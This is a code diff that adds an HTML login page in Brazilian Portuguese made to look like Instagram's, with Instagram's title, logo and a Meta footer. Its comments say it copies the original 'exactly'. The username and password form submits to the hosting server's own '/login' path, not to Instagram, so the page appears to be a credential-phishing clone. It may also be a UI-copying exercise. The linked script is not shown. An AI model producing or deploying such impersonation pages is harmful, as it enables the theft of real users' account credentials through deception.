@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Instagram • Login</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="script.js"></script>
+</head>
+<body>
+    <div class="container">
+        <!-- Seletor de idioma (exatamente como na foto) -->
+        <div class="language-selector">
+            <p>Português (Brasil) ▼</p>
+        </div>
+
+        <!-- Logo Instagram (sem texto, apenas o ícone) -->
+        <div class="logo">
+            <img src="instagram-logo.png" alt="Instagram" class="logo-img">
+        </div>
+
+        <form id="loginForm" method="POST" action="/login">
+            <div class="input-group">
+                <input type="text" name="username" id="username" placeholder="Nome de usuário, email ou celular" autocomplete="username" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="password" id="password" placeholder="Senha" autocomplete="current-password" required>
+            </div>
+            <button type="submit" class="login-btn">Entrar</button>
+            <a href="#" class="forgot-password" id="forgotPassword">Esqueceu a senha?</a>
+        </form>
+
+        <!-- Botão Criar nova conta (ficará lá em baixo) -->
+        <button class="signup-btn" id="signupBtn">Criar nova conta</button>
+
+        <!-- Rodapé com Meta -->
+        <footer class="footer">
+            <a href="#">Meta</a>
+        </footer>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
